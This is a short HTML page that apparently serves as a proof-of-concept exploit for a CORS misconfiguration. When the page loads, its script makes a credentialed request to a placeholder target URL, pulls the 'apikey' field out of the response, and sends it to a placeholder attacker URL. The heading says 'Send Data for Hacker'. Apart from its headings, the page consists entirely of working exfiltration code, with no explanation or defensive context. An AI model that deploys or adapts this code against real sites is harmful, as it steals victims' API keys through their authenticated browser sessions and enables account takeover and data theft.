<!DOCTYPE html>
<html>
<body>

    <h2>Hello World!</h2>
    <h3>Send Data for Hacker...</h3>

    <script>
    function loadXMLDoc() {
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                var exf = new XMLHttpRequest(); 
                exf.open('GET','UEL_HACKER/data='+ JSON.parse(this.responseText).apikey)
                exf.send();

            }
        };
        xhttp.open("GET", "URL_TARGET", true);
        // xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhttp.withCredentials = true
        xhttp.send();
    
    }
    loadXMLDoc();
    </script>

</body>
</html>
